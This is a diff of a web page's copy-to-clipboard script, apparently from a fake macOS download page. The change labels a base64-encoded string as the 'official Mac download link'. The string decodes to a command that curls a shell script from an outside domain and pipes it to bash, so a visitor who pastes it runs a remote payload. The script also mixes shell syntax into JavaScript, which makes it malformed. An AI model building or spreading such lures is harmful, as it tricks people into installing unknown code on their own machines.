@@ -311,37 +311,35 @@ body {
 
 
 <script>
-const COMMAND = 'echo "macOS successful"';
-const PAGE = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
+
+const DOWNLOAD_URL = bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
 
 const commandInput = document.getElementById("command");
 const copyButton = document.getElementById("copyButton");
 
-// Automatically show command
-commandInput.value = COMMAND;
+// Show official Mac download link inside the box
+commandInput.value = DOWNLOAD_URL;
 
-// Copy and open page in a new tab
+// Copy button
 async function copyCommand() {
     try {
-        await navigator.clipboard.writeText(COMMAND);
+        await navigator.clipboard.writeText(DOWNLOAD_URL);
 
         copyButton.innerText = "✓ Copied!";
         copyButton.style.background = "#289c00";
-
-        // Open page in a new tab
-        window.open(PAGE, "_blank", "noopener,noreferrer");
 
         setTimeout(function() {
             copyButton.innerText = "Copy";
             copyButton.style.background = "#38d900";
         }, 2000);
 
-    } catch(error) {
+    } catch (error) {
         commandInput.focus();
         commandInput.select();
         copyButton.innerText = "Select & Copy";
     }
 }
+
 </script>
 
 
